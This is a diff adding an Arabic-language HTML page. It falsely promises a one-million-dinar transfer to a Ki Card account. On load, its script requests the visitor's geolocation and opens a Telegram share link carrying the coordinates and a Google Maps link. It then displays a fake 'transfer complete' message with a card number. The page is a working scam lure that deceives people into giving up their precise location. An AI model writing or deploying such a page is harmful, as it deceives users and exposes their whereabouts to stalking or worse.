@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>إرسال الموقع عبر تليجرام</title>
+</head>
+<body>
+  <h2>سيتم تحويل مبلغ مليون دينار الى حساب كي كارد</h2>
+  <script>
+    function sendLocationViaUrl(lat, lon) {
+      const message = encodeURIComponent(`📍 موقع الشخص:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`);
+      const url = `https://t.me/share/url?url=${message}&text=${message}`;
+      window.open(url, "_blank");
+      document.body.innerHTML = "<h3>مبروك تم تحويل المبلغ على رقم البطاقة 9348435604</h3>";
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          sendLocationViaUrl(pos.coords.latitude, pos.coords.longitude);
+        },
+        (err) => {
+          document.body.innerHTML = "<h3>لم يتم التحويل</h3>";
+        }
+      );
+    } else {
+      document.body.innerHTML = "<h3>⚠️ جهازك لا يدعم تحديد الموقع</h3>";
+    }
+  </script>
+</body>
+</html>
